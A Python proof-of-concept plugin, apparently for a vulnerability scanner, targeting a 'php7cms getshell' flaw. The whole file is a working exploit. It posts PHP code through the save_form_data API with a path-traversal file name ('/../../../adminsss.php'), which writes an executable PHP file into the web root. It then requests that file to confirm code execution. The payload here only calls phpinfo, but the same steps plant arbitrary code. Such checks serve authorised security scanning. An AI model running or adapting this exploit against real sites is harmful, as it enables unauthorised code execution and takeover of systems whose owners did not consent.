#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'php7cms getshell'
        self.keyword = ['php7cms']
        self.info = 'php7cms getshell'
        self.type = 'rce'
        self.level = 'high'
        self.refer = 'https://paper.tuisec.win/detail/2139f76293bdb43'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.base_url, '../php7cms/'),
                self.url_normpath(self.url, 'php7cms/'),
                self.url_normpath(self.url, '../php7cms/'),
            ]))
            for path in path_list:
                postData = {
                    'data': '<?php phpinfo()?>'
                }
                url1 =  path + 'index.php?s=api&c=api&m=save_form_data&name=/../../../adminsss.php"'
                res = self.curl('post', url1, data=postData)
                if res !=None :
                    url2 = self.base_url + path + 'adminsss.php'
                    res = self.curl('get', url2)
                    if res !=None and  "php.ini" in res.text:
                        self.flag = 1
                        self.req.append({"url": url2})
                        self.res.append({"info": url1, "key": "php7cms getshell"})
                        break